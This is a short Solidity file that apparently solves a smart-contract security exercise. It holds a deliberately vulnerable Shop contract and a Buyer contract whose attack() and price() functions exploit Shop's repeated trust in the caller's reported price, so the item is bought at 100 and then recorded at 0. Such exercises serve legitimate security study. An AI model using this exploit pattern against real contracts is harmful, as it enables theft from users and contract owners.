pragma solidity ^0.6.0;

import 'hardhat/console.sol';
contract Shop {
  uint public price = 100;
  bool public isSold;

  function buy() public {
    Buyer _buyer = Buyer(msg.sender);

    if (_buyer.price() >= price && !isSold) {
      isSold = true;
      price = _buyer.price();
    }
  }

    function test2() public {
        bool a =this.isSold();
        console.log(a);
    }
}

contract Buyer{
    Shop instance;
    
    function attack(address addr) public {
        instance = Shop(addr);
        instance.buy();
    }
    
    function price() public view returns (uint){
        return Shop(msg.sender).isSold() == false?100:0;
    }
    
}